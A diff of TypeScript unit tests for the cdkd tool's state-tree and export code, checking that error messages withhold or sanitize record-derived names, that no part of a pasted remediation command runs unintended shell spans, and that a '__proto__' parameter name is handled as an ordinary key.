+        const backend = makeStateBackendMock({ [`${rootName}|us-east-1`]: root }) as S3StateBackend;
+        const thrown = await buildCdkdStateStackTree(rootName, 'us-east-1', backend).catch(
+          (e: unknown) => e
+        );
+        const message = (thrown as Error).message;
+        // Each case's PREMISE, pinned before the paste: a payload name is
+        // WITHHELD as not a plain identifier (go-to-k/cdkd#3997); its
+        // `-`-leading twin is withheld with the no-fill note above. Inert
+        // spans alone would pass a gate that stopped withholding.
+        expect(message).toContain(
+          rootName === value
+            ? "is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-'), which cdkd does not print on a command line."
+            : 'so do not fill a hole with it.'
+        );
+        expect(message).toContain(
+          "\nDrop it with: cdkd state orphan '<stack>' --stack-region '<region>'"
+        );
+        messages.push(message);
+      }
+    }
+    withPasteDir((dir) => {
+      for (const message of messages) {
+        expect(message).toContain('missing nested-child');
+        // From the remedy sentence on: the note and the command this change
+        // builds. The head before it still renders record values inside
+        // hand-written `'...'` (`safeSegment`), which is a PROSE shape outside
+        // this builder, and pasting it does run — so it is excluded here by
+        // name rather than allowed to pass a whole-message assertion.
+        const tail = message.slice(message.indexOf('The cdkd state tree is inconsistent'));
+        expect(tail).toContain('cdkd state orphan');
+        expect(spansThatRun(tail, dir), message).toEqual([]);
+      }
+    });
+  }, 120_000);
 
   /**
    * THE INSTRUMENT, after three review rounds each found another site.
@@ -3860,13 +4354,10 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
    * them raw. When adding a helper that returns a record-derived value, add its
    * binding here too; the derived half covers only values read off a receiver.
    *
-   * WHAT IT DOES NOT COVER, named so this is not read as "the record-derived
-   * class is closed": the record's `physicalId` / `properties` / `attributes`
-   * are body content at the same trust boundary and are rendered raw at ~40
-   * sites, including the plan printed directly above the destructive
-   * confirmation — go-to-k/cdkd#3375. That population needs a different
-   * instrument (a `properties` bag is an object, not an identifier), which is
-   * why it is a separate issue rather than a wider list here.
+   * The record's `physicalId` / `properties` / `attributes` are body content at
+   * the same trust boundary and have their own case below
+   * (go-to-k/cdkd#3375), since those values are not names and render through
+   * `showRecordValue` rather than `safeSegment`.
    *
    * SCOPE, stated because it is narrower than "every value in every message":
    * only the names `walkCdkdStateStackTree` MINTS from a record's own
@@ -3973,6 +4464,62 @@ describe('buildCdkdStateStackTree (issue #464 PR B1)', () => {
     expect(
       carrierJoins.filter((w) => !/safeSegment\(|safeDetail\(/.test(w)),
       'a list of record-derived names is joined into a message without a sanitizer'
+    ).toEqual([]);
+  });
+
+  /**
+   * The BODY-value half of the class (go-to-k/cdkd#3375): every interpolation
+   * that READS a record's `physicalId`, a `properties[...]` / `attributes[...]`
+   * value or a `resourceIdentifier` / `propertiesOverlay` map goes through a
+   * renderer that gives it a boundary and a cap.
+   *
+   * ITS LIMITS, the same kind the case above states: it matches NAMES inside a
+   * `${...}`, so it cannot see a value that reaches a message under another
+   * name — split out of a physical id into a local (`segment`, `vpcId`,
+   * `tuple.groupId`), bound by a loop (`printPlan`'s `v`, the overlay's
+   * `value`), returned by a helper — or one appended with `+` rather than
+   * interpolated, or an interpolation whose expression holds a `{` or a
+   * backtick. Those sites are pinned per message in
+   * `export-record-value-display.test.ts` and `export-plan-record-display.test.ts`.
+   * `displayAwsMessage` is deliberately NOT an accepted renderer: it bounds a
+   * value but gives it no boundary.
+   */
+  it('renders no record BODY value without a boundary in any message (go-to-k/cdkd#3375)', async () => {
+    const { readFileSync } = await import('node:fs');
+    const { fileURLToPath } = await import('node:url');
+    const source = readFileSync(
+      fileURLToPath(new URL('../../../src/cli/commands/export.ts', import.meta.url)),
+      'utf-8'
+    );
+    // One regex PER BRANCH, each with its own floor where the tree has sites,
+    // so one broken branch cannot hide behind another's matches
+    // (go-to-k/cdkd#3910). `attributes[`, `resourceIdentifier` and
+    // `propertiesOverlay` have NO interpolated site today — every such value
+    // reaches a message through a local — so they carry no floor: they stay
+    // watched, and the first site they match gets the boundary requirement.
+    const branches: Array<{ name: string; re: RegExp; floor: number }> = [
+      { name: 'physicalId', re: /\bphysicalId\b/, floor: 20 },
+      { name: 'properties[', re: /\bproperties\[/, floor: 1 },
+      { name: 'attributes[', re: /\battributes\[/, floor: 0 },
+      { name: 'resourceIdentifier', re: /\bresourceIdentifier\b/, floor: 0 },
+      { name: 'propertiesOverlay', re: /\bpropertiesOverlay\b/, floor: 0 },
+    ];
+    const rendered = /^(?:showRecordValue|preDeletedLine|commandHole)\(/;
+    const all = [...source.matchAll(/\$\{([^{}`]*)\}/g)]
+      .map((m) => ({ expr: (m[1] as string).trim(), at: m.index ?? 0 }))
+      // `Object.keys(...)` of a `resourceIdentifier` lists the splitter's own
+      // field-name constants, never a recorded value.
+      .filter(({ expr }) => !expr.startsWith('Object.keys('));
+    for (const { name, re, floor } of branches) {
+      const hits = all.filter(({ expr }) => re.test(expr) && rendered.test(expr));
+      expect(hits.length, `rendered sites for the ${name} branch`).toBeGreaterThanOrEqual(floor);
+    }
+    const interpolations = all.filter(({ expr }) => branches.some(({ re }) => re.test(expr)));
+    expect(
+      interpolations
+        .filter(({ expr }) => !rendered.test(expr))
+        .map(({ expr, at }) => `${expr} at offset ${at}`),
+      'a record body value is interpolated without a boundary'
     ).toEqual([]);
   });
 
@@ -4738,6 +5285,27 @@ describe('buildResolvedParametersPerStack (issue #464 follow-up — root-first p
     expect(intrinsicSkippedByCdkdName.size).toBe(0);
   });
 
+  it("reads a parent parameter named '__proto__' as an own key (go-to-k/cdkd#3916)", async () => {
+    // On a `{}` bag, assigning `__proto__` sets the PROTOTYPE, so the child's
+    // Ref would miss and the parameter would be skipped.
+    const rootTemplate = JSON.parse(
+      '{"Parameters":{"__proto__":{"Type":"String"}},"Resources":{"Child":{"Type":"AWS::CloudFormation::Stack","Properties":{"Parameters":{"Stage":{"Ref":"__proto__"}}}}}}'
+    ) as Record<string, unknown>;
+    const tree = treeNode('Root', new Map([['Child', treeNode('Root~Child', new Map())]]));
+    const { paramsByCdkdName, intrinsicSkippedByCdkdName } = await buildResolvedParametersPerStack({
+      rootStackName: 'Root',
+      rootParameters: [{ ParameterKey: '__proto__', ParameterValue: 'prod' }],
+      perStackNodes: [
+        node('Root', rootTemplate),
+        node('Root~Child', { Resources: {} }, { stack: 'Root', logicalId: 'Child' }),
+      ],
+      tree,
+      resolver,
+    });
+    expect(paramsByCdkdName.get('Root~Child')).toEqual([{ ParameterKey: 'Stage', ParameterValue: 'prod' }]);
+    expect(intrinsicSkippedByCdkdName.get('Root~Child')).toBeUndefined();
+  });
+
   it('records unresolvable Parameters in intrinsicSkippedByCdkdName', async () => {
     const rootTemplate = {
       Resources: {
@@ -4992,8 +5560,57 @@ describe('buildPerStackImportNodes (issue #464 PR B2)', () => {
       message.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))
     ).toBe(false);
     // And the suggested command is withheld, because the name does not render
-    // exactly once sanitized.
-    expect(message).toContain("cdkd state orphan '<stack>' --stack-region '<region>'");
+    // exactly once sanitized — LAST, on a labelled line of its own, with the
+    // gate's reason in the sentence before it (go-to-k/cdkd#3436).
+    expect(
+      message.endsWith("\nRemove it with: cdkd state orphan '<stack>' --stack-region '<region>'")
+    ).toBe(true);
+    expect(message).toContain(
+      "its record's stack name does NOT render exactly (another record may render identically)"
+    );
+  });
+
+  it('ends the missing-asset-path refusal on a NAMED orphan command, alone on its labelled line (go-to-k/cdkd#3436)', () => {
+    const tree: CdkdStateStackTree = {
+      stackName: 'Root',
+      region: 'us-east-1',
+      state: makeState({
+        stackName: 'Root',
+        region: 'us-east-1',
+        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
+      }),
+      nestedChildren: new Map([
+        [
+          'Child',
+          {
+            stackName: 'Root~Child',
+            region: 'us-east-1',
+            state: makeState({ stackName: 'Root~Child', region: 'us-east-1' }),
+            nestedChildren: new Map(),
+          },
+        ],
+      ]),
+    };
+    const thrown = (() => {
+      try {
+        buildPerStackImportNodes(
+          'Root',
+          { Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } } },
+          {},
+          'json',
+          tree
+        );
+        return undefined;
+      } catch (e: unknown) {
+        return e;
+      }
+    })();
+    const message = (thrown as Error).message;
+    expect(
+      message.endsWith(
+        "remove the cdkd state for the orphaned child.\nRemove it with: cdkd state orphan 'Root~Child' --stack-region us-east-1"
+      )
+    ).toBe(true);
   });
 
   it('loads a child template via the nested-template path index', () => {
